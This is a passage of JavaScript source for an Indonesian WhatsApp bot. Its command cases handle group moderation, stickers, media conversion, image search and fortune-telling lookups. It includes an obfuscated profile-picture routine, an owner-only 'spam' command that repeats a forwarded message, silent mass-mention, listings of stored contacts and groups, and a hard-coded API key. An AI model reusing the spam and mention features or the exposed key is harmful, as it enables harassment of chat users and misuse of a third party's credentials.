if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
//=================================================//
case 'tagall': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=================================================//
case 'hidetag': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
//=================================================//
case 'style': case 'styletext': {
if (isBan) throw sticBanLu(from) // respon ketika limit habis
db.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break
//=================================================//
 case 'group': case 'grup': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
const anmu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Group`,
}
haikal.sendMessage(m.chat, anmu, `Mode Group`, haikal.user.name, m)
 }
}
break
//=================================================//
case 'editinfo': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 const anju = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Edit Info`,
}
haikal.sendMessage(m.chat, anju, `Mode Edit Info`, haikal.user.name, m)
}
}
break
//=================================================//
 case 'mute': {
 if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === "on") {
if (db.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
db.chats[m.chat].mute = true
m.reply(`${haikal.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.chats[m.chat].mute = false
m.reply(`${haikal.user.name} telah di unmute di group ini !`)
} else {
 const anaku = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mute Bot`,
}
haikal.sendMessage(m.chat, anaku, `Mute Bot`, haikal.user.name, m)
}
 }
 break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await haikal.groupInviteCode(m.chat)
haikal.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'ephemeral': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
//=================================================//
case 'delete': case 'del': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//=================================================//
case 'infochat': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(m.chat, teks, m)
}
break
//=================================================//
case 'q': case 'quoted': {
if (isBan) throw sticBanLu(from)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (isBan) throw sticBanLu(from)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (isBan) throw sticBanLu(from)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'ebinary': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./baseikal/lib/binary')
let eb = await eBinary(text)
reply(eb)
}
break
//=================================================//
case 'dbinary': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./baseikal/lib/binary')
let db = await dBinary(text)
reply(db)
}
break
//=================================================//
case 'emojimix': {
if (isBan) throw sticBanLu(from)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'attp': case 'ttp': {
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Example : ${prefix + command} text`
 await haikal.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'haikal', 'morou', m, {asSticker: true})
 }
 break
case 'spam': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!m.quoted) return m.reply("Reply pesanya!")
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
quoted.copyNForward(m.chat, true)
}
} 
break
//=================================================//
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await haikal.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./baseikal/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await haikal.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'toimage': case 'toimg': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw sticBanLu(from)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted: m })
}
break
case 'tomp3': {
if (isBan) throw sticBanLu(from)
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted: m })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw sticBanLu(from)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
case 'togif': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (isBan) throw sticBanLu(from)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break

//=================================================//
case 'gimage': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} kaori cicak`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
const mllo = {
image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`
}
haikal.sendMessage(m.chat, mllo, { quoted: m })
})
}
break
//=================================================//
case 'pinterest': {
if (isBan) throw sticBanLu(from)
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
//=================================================//
case 'couple': {
if (isBan) throw sticBanLu(from)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
}
break
case 'coffe': case 'kopi': {
if (isBan) throw sticBanLu(from)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
haikal.sendMessage(m.chat, ko, { quoted: m })
}
break
//=================================================//
case 'wallpaper': {
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Query Title'
let { wallpaper } = require('./baseikal/lib/scraper')
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
const mlo = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
}
haikal.sendMessage(m.chat, mlo, { quoted: m })
}
break
//=================================================//
case 'wikimedia': {
if (isBan) throw sticBanLu(from)
if (!text) throw 'Masukkan Query Title'
let { wikimedia } = require('./baseikal/lib/scraper')
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
const mbk = {
image: { url: result.image },
caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`
}
haikal.sendMessage(m.chat, mbk, { quoted: m })
}
break
//=================================================//
case 'quotesanime': case 'quoteanime': {
if (isBan) throw sticBanLu(from)
let { quotesAnime } = require('./baseikal/lib/scraper')
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]
const anualas = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`
}
haikal.sendMessage(m.chat, anualas, { quoted: m })
}
break
//=================================================//
case 'nomerhoki': case 'nomorhoki': {
if (isBan) throw sticBanLu(from)
if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} belanja`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'suamiistri': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalancinta': case 'ramalcinta': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghwGans`
let anu = await primbon.arti_nama(text)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © banghw|Putri`
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return m.reply(anu.message)
haikal.sendImage(m.chat,anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) throw sticBanLu(from)
if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
haikal.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
